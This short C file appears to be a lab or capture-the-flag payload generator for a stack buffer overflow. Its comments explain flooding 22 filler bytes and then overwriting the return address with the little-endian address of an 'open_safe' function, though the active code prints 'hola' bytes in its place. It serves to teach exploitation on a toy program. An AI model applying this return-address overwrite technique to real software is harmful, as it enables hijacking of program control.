/* open.c */
#include <stdio.h>

int main() {
  int i;

  // Uncomment to add 22 random bytes
  // printf("\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01");
  
  for (i = 0; i < 1; i++)  
  {                                                   // &hola: '\x68','\x6f','\x6c','\x61'
    printf("%c%c%c%c",'\x68','\x6f','\x6c','\x61');   // This is the return address
  }                                                   // &open_safe: '\x96','\x11','\x40','\x00'
}

// To successfully perform the buffer overflow flood 26 bytes as such:
//
// -- First 22 bytes: any random value (just needs to flood)
// -- Last 4 bytes: strictly the address of the open_safe function reversed
// -- -- this means, the original address is 0x00401196, so the reversed address is 0x96114000